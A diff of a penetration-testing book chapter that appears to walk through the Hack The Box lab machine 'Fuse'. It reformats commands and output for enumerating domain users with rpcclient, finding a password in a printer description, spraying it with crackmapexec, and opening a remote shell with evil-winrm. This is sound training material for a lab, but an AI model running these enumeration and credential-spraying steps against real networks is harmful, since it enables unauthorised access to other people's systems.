-user:\[dmuir\] rid:\[0x1db3\]
-
-rpcclient $&gt;
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+rpcclient $>
+```
 
 We can collect all of the users and create a new users file with these users in it called rpc\_users.txt and then just extract the usernames with the command:
 
-cat rpc\_users.txt \| awk -F '\\[\|\]' '{print $2}' &gt; rpc\_users2.txt
+```bash
+cat rpc_users.txt | awk -F '\[|]' '{print $2}' > rpc_users2.txt
+```
 
 The awk command uses the -F flag to specify the field separator regular expression. We are separating the text between the square bracket \(\[\]\) characters. The '\' is necessary to escape the first \[. If we try and write to the same file, it will end up blank and so that is why we need to create a separate file.
 
 Back on rpcclient, we can look at printers that might be shared by using the enumprinters command. This gives output which contains a password:
 
-rpcclient $&gt; enumprinters
-
-flags:\[0x800000\]
-
-name:\[\10.129.70.212\HP-MFT01\]
-
-description:\[\10.129.70.212\HP-MFT01,HP Universal Printing PCL 6,Central \(Near IT, scan2docs password: $fab@s3Rv1ce$1\)\]
-
-comment:\[\]
-
-rpcclient $&gt;
+```bash
+rpcclient $> enumprinters
+flags:[0x800000]
+name:[\10.129.70.212\HP-MFT01]
+description:[\10.129.70.212\HP-MFT01,HP Universal Printing PCL 6,
+    Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+comment:[]
+rpcclient $>
+```
 
 A password has been saved in the description $fab@s3Rv1ce$1 which we can test with the users we enumerated earlier:
 
-┌─\[oztechmuse@parrot\]─\[~/boxes/Fuse\]
-
-└──╼ $crackmapexec smb fuse.htb -u rpc\_users.txt -p '$fab@s3Rv1ce$1'
-
-SMB 10.129.70.212 445 FUSE \[\*\] Windows Server 2016 Standard 14393 x64 \(name:FUSE\) \(domain:fabricorp.local\) \(signing:True\) \(SMBv1:True\)
-
-SMB 10.129.70.212 445 FUSE \[-\] fabricorp.local\Administrator:$fab@s3Rv1ce$1 STATUS\_LOGON\_FAILURE
-
-SMB 10.129.70.212 445 FUSE \[+\] fabricorp.local\svc-print:$fab@s3Rv1ce$1
+```bash
+┌─[oztechmuse@parrot]─[~/boxes/Fuse]
+└──╼ $crackmapexec smb fuse.htb -u rpc_users.txt -p '$fab@s3Rv1ce$1'
+SMB 10.129.70.212 445 FUSE [*] Windows Server 2016 Standard 14393 x64 
+    (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB 10.129.70.212 445 FUSE [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1 
+    STATUS_LOGON_FAILURE
+SMB 10.129.70.212 445 FUSE [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
+```
 
 We get a hit with the username svc-print which we can then use to get access with evil-wrinrm:
 
-┌─\[rin@parrot\]─\[~/boxes/Fuse\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Fuse]
 └──╼ $evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb
-
 Evil-WinRM shell v2.3
-
 Info: Establishing connection to remote endpoint
-
-\*Evil-WinRM\* PS C:\Users\svc-print\Documents&gt;
+*Evil-WinRM* PS C:\Users\svc-print\Documents>
+```
 
 The user flag is in c:\Users\svc-print\Desktop\users.txt.
 
 We will leave this here and come back to Fuse in a subsequent chapter where we cover further enumeration for discovery and privilege escalation. Next however we are going to explore custom exploitation as a means of gaining initial access.
 
-1. 
